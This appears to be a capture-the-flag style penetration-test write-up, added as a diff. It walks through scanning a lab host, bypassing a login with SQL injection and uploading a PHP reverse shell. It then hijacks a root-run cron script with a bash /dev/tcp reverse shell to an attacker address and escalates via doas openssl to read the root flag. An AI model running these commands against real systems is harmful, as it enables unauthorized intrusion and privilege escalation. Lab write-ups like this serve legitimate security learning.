@@ -1,0 +1,180 @@
+# Penetration Test Writeup
+
+## Nmap scan:
+
+```
+nmap -sS -sV 10.10.212.224   
+```
+
+```
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
+445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+---
+
+I tried gobuster with: 
+
+```
+gobuster dir -u 10.10.212.224:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+Starting gobuster in directory enumeration mode  
+===============================================================  
+```
+/admin                (Status: 301) [Size: 314] [--> http://10.10.212.224/admin/]
+/shadow               (Status: 200) [Size: 25]
+/passwd               (Status: 200) [Size: 25]
+```
+
+This path pages were a deadend so I tried the other port:
+
+```
+gobuster dir -u http://10.10.212.224:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+Starting gobuster in directory enumeration mode  
+===============================================================  
+```
+/management           (Status: 301) [Size: 324] [--> http://10.10.212.224:445/management/]
+```
+
+I got into: http://10.10.212.224:445/management/  
+And was presented with a login page.
+
+After inspecting and viewing source, first thing I tried was an SQLi
+
+```
+' OR '1'='1' -- 
+```
+
+And that's all it took. That was easy.
+
+---
+
+I was able to upload files so instead of just testing with for example:
+
+```php
+<?php echo "Test successful"; ?>
+```
+
+I uploaded a revershe shell from: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+And opened a listener:
+
+```
+nc- lvnp 4000
+```
+
+I'm in.  
+Now I need a TTY spawn in shell:  
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+I ran linpeas to find a vulnerability in a cronjob:  
+```
+* *     * * *   plot_admin /var/www/scripts/backup.sh
+```
+
+I didn't have permissions to write in it but i was the owner of this directory: `/var/www/scripts`  
+If you own the directory, you can delete and replace any file inside it even if you can’t modify the file itself.
+
+So, i ran:
+```
+rm /var/www/scripts/backup.sh
+```
+To delete the file and then:
+```
+echo '#!/bin/bash' > /var/www/scripts/backup.sh
+```
+
+- I Deleted the original backup.sh (because www-data owns the directory)  
+- Created a new file with my content, owned by www-data
+
+Then I ran:
+```
+echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.21.***.***/4444 0>&1"' >> /var/www/scripts/backup.sh
+```
+
+Explanation:
+
+- `/bin/bash -c` (Runs the following string as a bash command.)  
+- `/bin/bash -i` (Spawns an interactive bash shell.)
+
+```
+>& /dev/tcp/10.21.***.***/4444
+```
+This part is doing a reverse shell:
+
+- `>` redirects stdout  
+- `&` means "also send stderr"  
+- `/dev/tcp/...` is a special bash feature that opens a TCP connection to your attacker machine 
+
+Then i gave it executable rights:
+
+```
+chmod +x /var/www/scripts/backup.sh
+```
+
+After a minute of listening, i got in:
+
+```
+$ whoami
+plot_admin
+```
+
+With the `ls` command I was able to retrieve the first flag.
+
+---
+
+Now i ran `linpeas.sh` once again and found one critical vulnerability:  
+Checking doas.conf  
+```
+permit nopass plot_admin as root cmd openssl 
+```
+
+Then I went to: https://gtfobins.github.io/gtfobins/openssl  
+And on the read section:
+
+```
+LFILE=file_to_read
+openssl enc -in "$LFILE"
+```
+
+I wasn't sure if the file was actually on `/root/root.txt`  
+But that's where it usually is, so I tried:
+
+```
+LFILE=/root/root.txt
+doas -u root openssl enc -in "$LFILE"
+```
+
+Explanation:
+
+- `LFILE=/root/root.txt`  
+    I defined a variable LFILE pointing to the flag file
+
+- `doas -u root ...`  
+    I told doas to run a command as root.  
+    plot_admin is permitted to run openssl as root without a password, thanks to:  
+    `permit nopass plot_admin as root cmd openssl`
+
+- `openssl enc -in "$LFILE"`  
+    This command usually encrypts input, but here you used it just to read the file.
+
+
+
+
+
+
+
+
+
+
+
